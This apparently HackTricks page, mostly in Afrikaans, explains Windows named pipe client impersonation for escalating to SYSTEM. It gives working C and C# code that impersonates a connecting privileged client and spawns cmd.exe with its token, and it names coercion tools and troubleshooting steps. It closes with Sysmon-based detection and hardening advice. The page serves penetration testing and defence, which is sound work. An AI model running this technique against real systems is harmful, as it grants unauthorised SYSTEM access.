# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is 'n plaaslike privilege escalation-primitief wat 'n named-pipe-bedienerdraad toelaat om die sekuriteitskonteks van 'n kliënt wat daaraan koppel, aan te neem. In praktyk kan 'n aanvaller wat kode kan uitvoer met SeImpersonatePrivilege 'n bevoorregte kliënt (bv. 'n SYSTEM-diens) dwing om met 'n aanvaller-beheerde pipe te koppel, ImpersonateNamedPipeClient aanroep, die gevolglike token na 'n primêre token dupliseer, en 'n proses as die kliënt spawen (dikwels NT AUTHORITY\SYSTEM).

Hierdie bladsy fokus op die kerntegniek. Vir end-to-end exploit chains wat SYSTEM dwing om na jou pipe te koppel, sien die Potato family pages hieronder.

## TL;DR
- Skep 'n named pipe: \\.\pipe\<random> en wag vir 'n verbinding.
- Laat 'n bevoorregte komponent daarmee koppel (spooler/DCOM/EFSRPC/etc.).
- Lees ten minste een boodskap uit die pipe, en roep dan ImpersonateNamedPipeClient aan.
- Maak die impersonasietoken van die huidige draad oop, DuplicateTokenEx(TokenPrimary), en gebruik CreateProcessWithTokenW/CreateProcessAsUser om 'n SYSTEM-proses te kry.

## Requirements and key APIs
- Privileges wat tipies benodig word deur die oproepende proses/draad:
- SeImpersonatePrivilege om suksesvol 'n koppelende kliënt te impersonate en om CreateProcessWithTokenW te gebruik.
- Alternatiewelik, nadat jy SYSTEM geïmpersonate het, kan jy CreateProcessAsUser gebruik, wat moontlik SeAssignPrimaryTokenPrivilege en SeIncreaseQuotaPrivilege vereis (hierdie word bevredig wanneer jy SYSTEM impersonate).
- Kern-API's wat gebruik word:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (moet ten minste een boodskap lees voordat impersonasie plaasvind)
- ImpersonateNamedPipeClient en RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW of CreateProcessAsUser
- Impersonation level: om nuttige aksies plaaslik uit te voer, moet die kliënt SecurityImpersonation toelaat (standaard vir baie plaaslike RPC-/named-pipe-kliënte). Kliënte kan dit verlaag met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wanneer hulle die pipe oopmaak.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Aantekeninge:
- As ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) teruggee, maak seker jy lees eers van die pyp en dat die kliënt impersonation nie tot die Identification-vlak beperk het nie.
- Gebruik by voorkeur DuplicateTokenEx met SecurityImpersonation en TokenPrimary om ’n primary token geskik vir process creation te skep.

## .NET vinnige voorbeeld
In .NET kan NamedPipeServerStream deur RunAsClient impersonate. Sodra impersonating, dupliceer die thread token en skep ’n process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Algemene triggers/afdwongings om SYSTEM na jou pipe te kry
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Probleemoplossing en valstrikke
- Jy moet ten minste een boodskap vanaf die pipe lees voordat jy ImpersonateNamedPipeClient aanroep; anders sal jy ERROR_CANNOT_IMPERSONATE (1368) kry.
- As die kliënt koppel met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, kan die bediener nie volledig impersonate nie; kontroleer die token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW vereis SeImpersonatePrivilege op die caller. As dit misluk met ERROR_PRIVILEGE_NOT_HELD (1314), gebruik CreateProcessAsUser nadat jy reeds impersonated SYSTEM.
- Maak seker dat jou pipe se security descriptor die teiken-diens toelaat om te koppel as jy dit verhard; standaard is pipes onder \\.\pipe toeganklik volgens die server’s DACL.

## Opsporing en verharding
- Moniteer named pipe creation en verbindings. Sysmon Event IDs 17 (Pipe Created) en 18 (Pipe Connected) is nuttig om geldige pipe-namme te basiseer en om ongewone, ewekansig-kykende pipes op te spoor wat token-manipulation events voorafgaan.
- Soek vir reekse: proses skep 'n pipe, 'n SYSTEM-diens koppel, dan spawn die skeppende proses 'n child as SYSTEM.
- Verminder blootstelling deur SeImpersonatePrivilege van nie-essensiële diensrekeninge te verwyder en deur onnodige service logons met hoë voorregte te vermy.
- Verdedigende ontwikkeling: wanneer jy aan onbetroubare named pipes koppel, spesifiseer SECURITY_SQOS_PRESENT met SECURITY_IDENTIFICATION om te verhoed dat bedieners die kliënt volledig impersonate tensy dit nodig is.

## Verwysings
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
